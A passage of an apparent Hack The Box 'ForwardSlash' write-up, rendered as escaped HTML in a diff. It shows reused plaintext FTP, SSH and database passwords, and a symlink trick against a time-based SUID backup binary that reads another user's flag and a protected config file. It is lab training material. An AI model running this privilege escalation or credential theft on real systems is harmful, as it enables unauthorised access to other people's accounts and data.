+&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;conn_id&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ftp_connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;or&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;Couldn&amp;#39;t connect to $ip\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="n"&gt;error_log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;Logging in&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;@ftp_login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;conn_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;chiv&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;N0bodyL1kesBack/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="w"&gt;                    &lt;/span&gt;&lt;span class="n"&gt;error_log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;Getting file&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="w"&gt;                    &lt;/span&gt;&lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ftp_get_string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;conn_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;debug.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This credentials are also valid for the SSH service as &lt;code&gt;chiv&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ ssh chiv@forwardslash.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;chiv@forwardslash.htb&amp;#39;s password:&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;snip&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;chiv@forwardslash:~$&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;There is no user.txt in &lt;code&gt;chiv&lt;/code&gt;'s home folder. The other user is &lt;code&gt;pain&lt;/code&gt; with the
+&lt;code&gt;uid&lt;/code&gt; 1000. We start enumerating the box for a privilege escalation.&lt;/p&gt;
+&lt;p&gt;We can list the file in the &lt;code&gt;pain&lt;/code&gt; user homefolder. The &lt;code&gt;encryptorinator&lt;/code&gt; and
+&lt;code&gt;note.txt&lt;/code&gt; are even readable by they are for the root part, so we will come back
+to them later.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chiv@forwardslash:~$ ls ../pain/&lt;/span&gt;
+&lt;span class="code-line"&gt;encryptorinator  note.txt  user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;When looking at &lt;code&gt;/var/backups/&lt;/code&gt; we see a few interesting files, mainly the
+&lt;code&gt;config.php.bak&lt;/code&gt; that is only readable by the &lt;code&gt;pain&lt;/code&gt; user.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chiv@forwardslash:~$ ls /var/backups/ -l&lt;/span&gt;
+&lt;span class="code-line"&gt;total 996&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r-- 1 root root            61440 Mar 24 06:25 alternatives.tar.0&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r-- 1 root root            38908 Mar 24 06:17 apt.extended_states.0&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r-- 1 root root             4115 Mar  6 14:17 apt.extended_states.1.gz&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r-- 1 root root             3909 Mar  5 14:46 apt.extended_states.2.gz&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw------- 1 pain pain              526 Jun 21  2019 config.php.bak&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r-- 1 root root              437 Mar  5 14:07 dpkg.diversions.0&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r-- 1 root root              202 Mar  5 14:07 dpkg.diversions.1.gz&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r-- 1 root root              207 Mar  5 14:47 dpkg.statoverride.0&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r-- 1 root root              171 Mar  5 14:47 dpkg.statoverride.1.gz&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r-- 1 root root           668374 Mar 24 06:17 dpkg.status.0&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-r--r-- 1 root root           188241 Mar 24 06:17 dpkg.status.1.gz&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw------- 1 root root              730 Mar 17 20:13 group.bak&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw------- 1 root shadow            604 Mar 17 20:13 gshadow.bak&lt;/span&gt;
+&lt;span class="code-line"&gt;-r--r--r-- 1 root root              129 May 27  2019 note.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw------- 1 root root             1660 Mar  5 14:46 passwd.bak&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxrwx--- 2 root backupoperator   4096 May 27  2019 recovery&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw------- 1 root shadow           1174 Mar  6 14:21 shadow.bak&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;When looking for SUID binary we found that the binary &lt;code&gt;/usr/bin/backup&lt;/code&gt; is SUID
+and belonging to the &lt;code&gt;pain&lt;/code&gt; user.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chiv@forwardslash:/home/pain$ find / -uid 1000 -perm -4000 -type f 2&amp;gt;/dev/null&lt;/span&gt;
+&lt;span class="code-line"&gt;/usr/bin/backup&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The binary is a standard linux program. When we run it, it told us that a file
+doesn't exist. The filename looks like a MD5 hash.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chiv@forwardslash:/home/pain$ file /usr/bin/backup&lt;/span&gt;
+&lt;span class="code-line"&gt;/usr/bin/backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=e0fcfb1c48fe0b5377774c1d237dc50ddfa41c08, not stripped&lt;/span&gt;
+&lt;span class="code-line"&gt;chiv@forwardslash:/home/pain$ /usr/bin/backup&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;        Pain&amp;#39;s Next-Gen Time Based Backup Viewer&lt;/span&gt;
+&lt;span class="code-line"&gt;        v0.1&lt;/span&gt;
+&lt;span class="code-line"&gt;        NOTE: not reading the right file yet,&lt;/span&gt;
+&lt;span class="code-line"&gt;        only works if backup is taken in same second&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Current Time: 10:14:45&lt;/span&gt;
+&lt;span class="code-line"&gt;ERROR: f057d631c54aae27e968bc3fafb02b4e Does Not Exist or Is Not Accessible By Me, Exiting...&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We use &lt;code&gt;ltrace&lt;/code&gt; to see what are the system call of the program and we see that
+the filename is a MD5 hash of the current time.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chiv@forwardslash:/home/pain$ ltrace /usr/bin/backup&lt;/span&gt;
+&lt;span class="code-line"&gt;getuid()                                                                                                                                         = 1001&lt;/span&gt;
+&lt;span class="code-line"&gt;getgid()                                                                                                                                         = 1001&lt;/span&gt;
+&lt;span class="code-line"&gt;puts(&amp;quot;--------------------------------&amp;quot;...----------------------------------------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;        Pain&amp;#39;s Next-Gen Time Based Backup Viewer&lt;/span&gt;
+&lt;span class="code-line"&gt;        v0.1&lt;/span&gt;
+&lt;span class="code-line"&gt;        NOTE: not reading the right file yet,&lt;/span&gt;
+&lt;span class="code-line"&gt;        only works if backup is taken in same second&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;)                                                                                                      = 277&lt;/span&gt;
+&lt;span class="code-line"&gt;time(0)                                                                                                                                          = 1588846490&lt;/span&gt;
+&lt;span class="code-line"&gt;localtime(0x7ffdb8c71790)                                                                                                                        = 0x7f373a3526a0&lt;/span&gt;
+&lt;span class="code-line"&gt;malloc(13)                                                                                                                                       = 0x56277209e8e0&lt;/span&gt;
+&lt;span class="code-line"&gt;sprintf(&amp;quot;10:14:50&amp;quot;, &amp;quot;%02d:%02d:%02d&amp;quot;, 10, 14, 50)                                                                                                = 8&lt;/span&gt;
+&lt;span class="code-line"&gt;strlen(&amp;quot;10:14:50&amp;quot;)                                                                                                                               = 8&lt;/span&gt;
+&lt;span class="code-line"&gt;malloc(33)                                                                                                                                       = 0x56277209e900&lt;/span&gt;
+&lt;span class="code-line"&gt;MD5_Init(0x7ffdb8c716e0, 4000, 0x56277209e900, 0x56277209e900)                                                                                   = 1&lt;/span&gt;
+&lt;span class="code-line"&gt;MD5_Update(0x7ffdb8c716e0, 0x56277209e8e0, 8, 0x56277209e8e0)                                                                                    = 1&lt;/span&gt;
+&lt;span class="code-line"&gt;MD5_Final(0x7ffdb8c71740, 0x7ffdb8c716e0, 0x7ffdb8c716e0, 0)                                                                                     = 1&lt;/span&gt;
+&lt;span class="code-line"&gt;snprintf(&amp;quot;9c&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x9c)                                                                                                                 = 2&lt;/span&gt;
+&lt;span class="code-line"&gt;snprintf(&amp;quot;71&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x71)                                                                                                                 = 2&lt;/span&gt;
+&lt;span class="code-line"&gt;snprintf(&amp;quot;36&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x36)                                                                                                                 = 2&lt;/span&gt;
+&lt;span class="code-line"&gt;snprintf(&amp;quot;55&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x55)                                                                                                                 = 2&lt;/span&gt;
+&lt;span class="code-line"&gt;snprintf(&amp;quot;35&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x35)                                                                                                                 = 2&lt;/span&gt;
+&lt;span class="code-line"&gt;snprintf(&amp;quot;e4&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0xe4)                                                                                                                 = 2&lt;/span&gt;
+&lt;span class="code-line"&gt;snprintf(&amp;quot;4d&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x4d)                                                                                                                 = 2&lt;/span&gt;
+&lt;span class="code-line"&gt;snprintf(&amp;quot;c7&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0xc7)                                                                                                                 = 2&lt;/span&gt;
+&lt;span class="code-line"&gt;snprintf(&amp;quot;6d&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x6d)                                                                                                                 = 2&lt;/span&gt;
+&lt;span class="code-line"&gt;snprintf(&amp;quot;65&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x65)                                                                                                                 = 2&lt;/span&gt;
+&lt;span class="code-line"&gt;snprintf(&amp;quot;bb&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0xbb)                                                                                                                 = 2&lt;/span&gt;
+&lt;span class="code-line"&gt;snprintf(&amp;quot;cd&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0xcd)                                                                                                                 = 2&lt;/span&gt;
+&lt;span class="code-line"&gt;snprintf(&amp;quot;1f&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x1f)                                                                                                                 = 2&lt;/span&gt;
+&lt;span class="code-line"&gt;snprintf(&amp;quot;aa&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0xaa)                                                                                                                 = 2&lt;/span&gt;
+&lt;span class="code-line"&gt;snprintf(&amp;quot;ab&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0xab)                                                                                                                 = 2&lt;/span&gt;
+&lt;span class="code-line"&gt;snprintf(&amp;quot;14&amp;quot;, 32, &amp;quot;%02x&amp;quot;, 0x14)                                                                                                                 = 2&lt;/span&gt;
+&lt;span class="code-line"&gt;printf(&amp;quot;Current Time: %s\n&amp;quot;, &amp;quot;10:14:50&amp;quot;Current Time: 10:14:50&lt;/span&gt;
+&lt;span class="code-line"&gt;)                                                                                                         = 23&lt;/span&gt;
+&lt;span class="code-line"&gt;setuid(1002)                                                                                                                                     = -1&lt;/span&gt;
+&lt;span class="code-line"&gt;setgid(1002)                                                                                                                                     = -1&lt;/span&gt;
+&lt;span class="code-line"&gt;access(&amp;quot;9c71365535e44dc76d65bbcd1faaab14&amp;quot;..., 0)                                                                                                 = -1&lt;/span&gt;
+&lt;span class="code-line"&gt;printf(&amp;quot;ERROR: %s Does Not Exist or Is N&amp;quot;..., &amp;quot;9c71365535e44dc76d65bbcd1faaab14&amp;quot;...ERROR: 9c71365535e44dc76d65bbcd1faaab14 Does Not Exist or Is Not Accessible By Me, Exiting...&lt;/span&gt;
+&lt;span class="code-line"&gt;)                                                             = 94&lt;/span&gt;
+&lt;span class="code-line"&gt;setuid(1001)                                                                                                                                     = 0&lt;/span&gt;
+&lt;span class="code-line"&gt;setgid(1001)                                                                                                                                     = 0&lt;/span&gt;
+&lt;span class="code-line"&gt;remove(&amp;quot;9c71365535e44dc76d65bbcd1faaab14&amp;quot;...)                                                                                                    = -1&lt;/span&gt;
+&lt;span class="code-line"&gt;+++ exited (status 0) +++&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;With a simple combination of &lt;code&gt;grep&lt;/code&gt; and &lt;code&gt;cut&lt;/code&gt; we can extract the current filename
+used by the program:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chiv@forwardslash:~$ /usr/bin/backup | grep ERROR | cut -d &amp;#39; &amp;#39; -f 2&lt;/span&gt;
+&lt;span class="code-line"&gt;705159512ab36c24a46aead527de7fb5&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can then create a temporary folder and try to get the file &lt;code&gt;user.txt&lt;/code&gt; in
+pain's homedir by creating a symlink with the name of the file used by the backup
+program and then read it.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chiv@forwardslash:/tmp/lolo$ ln -s /home/pain/user.txt ./$(/usr/bin/backup | grep ERROR | cut -d &amp;#39; &amp;#39; -f 2)  &amp;amp;&amp;amp; /usr/bin/backup&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;        Pain&amp;#39;s Next-Gen Time Based Backup Viewer&lt;/span&gt;
+&lt;span class="code-line"&gt;        v0.1&lt;/span&gt;
+&lt;span class="code-line"&gt;        NOTE: not reading the right file yet,&lt;/span&gt;
+&lt;span class="code-line"&gt;        only works if backup is taken in same second&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Current Time: 12:28:53&lt;/span&gt;
+&lt;span class="code-line"&gt;aec49cafdb7eec8710d3bdf623ac28f7&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We apply the same thing for the &lt;code&gt;config.php.bak&lt;/code&gt; file in &lt;code&gt;/var/backup/&lt;/code&gt; and get
+some database credentials.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chiv@forwardslash:/tmp/lolo$ ln -s /var/backups/config.php.bak ./$(/usr/bin/backup | grep ERROR | cut -d &amp;#39; &amp;#39; -f 2)  &amp;amp;&amp;amp; /usr/bin/backup&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;        Pain&amp;#39;s Next-Gen Time Based Backup Viewer&lt;/span&gt;
+&lt;span class="code-line"&gt;        v0.1&lt;/span&gt;
+&lt;span class="code-line"&gt;        NOTE: not reading the right file yet,&lt;/span&gt;
+&lt;span class="code-line"&gt;        only works if backup is taken in same second&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Current Time: 12:28:11&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class="code-line"&gt;/* Database credentials. Assuming you are running MySQL&lt;/span&gt;
+&lt;span class="code-line"&gt;server with default setting (user &amp;#39;root&amp;#39; with no password) */&lt;/span&gt;
+&lt;span class="code-line"&gt;define(&amp;#39;DB_SERVER&amp;#39;, &amp;#39;localhost&amp;#39;);&lt;/span&gt;
+&lt;span class="code-line"&gt;define(&amp;#39;DB_USERNAME&amp;#39;, &amp;#39;pain&amp;#39;);&lt;/span&gt;
+&lt;span class="code-line"&gt;define(&amp;#39;DB_PASSWORD&amp;#39;, &amp;#39;db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704&amp;#39;);&lt;/span&gt;
+&lt;span class="code-line"&gt;define(&amp;#39;DB_NAME&amp;#39;, &amp;#39;site&amp;#39;);&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;/* Attempt to connect to MySQL database */&lt;/span&gt;
+&lt;span class="code-line"&gt;$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;// Check connection&lt;/span&gt;
+&lt;span class="code-line"&gt;if($link === false){&lt;/span&gt;
+&lt;span class="code-line"&gt;    die(&amp;quot;ERROR: Could not connect. &amp;quot; . mysqli_connect_error());&lt;/span&gt;
+&lt;span class="code-line"&gt;}&lt;/span&gt;
+&lt;span class="code-line"&gt;?&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This credentials allows us to connect as pain using SSH (we can grab the
+&lt;code&gt;user.txt&lt;/code&gt; again).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_cache$ ssh pain@10.10.10.183&lt;/span&gt;
+&lt;span class="code-line"&gt;pain@10.10.10.183&amp;#39;s password:&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;snip&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;pain@forwardslash:~$ cat user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;96628de4960f22df8f7006205a8fa0bf&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="getting-root"&gt;Getting root&lt;/h2&gt;
+&lt;p&gt;In &lt;code&gt;pain&lt;/code&gt; homefolder we also found a &lt;code&gt;note.txt&lt;/code&gt; which disclose that some
+"important" file are encrypted using homemade crypto (&lt;strong&gt;never use homemade
+crypto&lt;/strong&gt;).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pain@forwardslash:~$ cat note.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;-chiv&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The folder &lt;code&gt;encryptorinator&lt;/code&gt; contains a scripts in order to encrypt and
+decrypt a message and an encrypted message. The &lt;code&gt;encrypter&lt;/code&gt; script is the
+following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;char_key&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;-=&lt;/span&gt; &lt;span class="mi"&gt;256&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
